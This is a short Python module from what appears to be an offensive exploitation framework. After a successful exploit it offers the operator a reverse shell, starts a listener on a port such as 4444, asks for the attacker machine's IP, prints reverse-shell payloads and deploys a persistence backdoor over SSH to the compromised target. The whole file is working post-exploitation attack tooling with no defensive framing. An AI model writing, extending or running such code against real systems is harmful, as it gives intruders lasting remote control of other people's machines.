"""Unified reverse-shell offer after successful exploitation."""

from engines.utils import log


def offer_reverse_shell(
    context: str,
    target_ip: str,
    ssh_client=None,
    ssh_port: int | None = None,
    auto_mode: bool = False,
) -> bool:
    """
    Prompt operator to start a listener and optionally deploy via SSH.
    In auto_mode, skip interactive prompt (for non-interactive CI).
    """
    if auto_mode:
        return False

    print("\n" + "=" * 50)
    log(f"Exploit succeeded: {context} on {target_ip}", "PWN")
    print("=" * 50)

    choice = input("\n[?] Open reverse shell / deploy persistence backdoor? (y/n): ").strip().lower()
    if choice != "y":
        return False

    from engines.persistence import PersistenceAgent

    agent = PersistenceAgent(target_ip, ssh_port)
    listener_port = input("[?] Local port to listen on (default 4444): ").strip() or "4444"
    if not listener_port.isdigit():
        log("Invalid port.", "ERROR")
        return False

    local_ip = input("[?] Your local IP (attacker machine): ").strip()
    if not local_ip:
        log("Local IP is required.", "ERROR")
        return False

    agent.start_listener(listener_port)
    payloads = agent.generate_reverse_shell_payload(local_ip, listener_port)

    print("\n[!] Payloads (use if target has shell but no SSH):")
    for name, payload in payloads.items():
        print(f"    [{name}] {payload}")

    if ssh_client is not None:
        agent.deploy_backdoor_ssh(ssh_client, local_ip, listener_port)
        log("Backdoor deployment attempted via SSH.", "SUCCESS")
    else:
        log("No SSH session — copy a payload above into the compromised shell.", "INFO")

    return True
